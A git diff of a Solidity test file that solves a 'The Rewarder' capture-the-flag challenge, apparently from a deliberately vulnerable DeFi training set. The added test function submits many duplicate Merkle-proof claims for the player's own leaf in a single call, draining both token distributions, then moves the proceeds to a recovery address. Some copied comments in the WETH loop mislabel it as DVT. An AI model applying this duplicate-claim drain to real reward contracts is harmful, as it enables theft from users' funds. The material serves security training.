@@ -89,13 +89,6 @@ contract TheRewarderChallenge is Test {
         // Create Alice's claims
         Claim[] memory claims = new Claim[](2);
 
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[0]);
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[1]);
-        console.logBytes32(merkle.getProof(dvtLeaves, 2)[2]);
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[0]);
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[1]);
-        console.logBytes32(merkle.getProof(wethLeaves, 2)[2]);
-
         // First, the DVT claim
         claims[0] = Claim({
             batchNumber: 0, // claim corresponds to first DVT batch
@@ -155,7 +148,45 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+        uint256 dvtPlayerReward = 11524763827831882;
+        uint256 wethPlayerReward = 1171088749244340;
+        uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
+        uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;
+
+        Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+        for (uint256 i = 0; i < dvtAttackCount; i++) {
+            claims[i] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: dvtPlayerReward,
+            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
+            });
+        }
+        for (uint256 i = 0; i < wethAttackCount; i++) {
+            claims[dvtAttackCount + i] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: wethPlayerReward,
+            tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
+            });
+        }
+
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -186,7 +217,6 @@ contract TheRewarderChallenge is Test {
 
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
-        //console.logBytes(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))));
         Reward[] memory rewards =
             abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
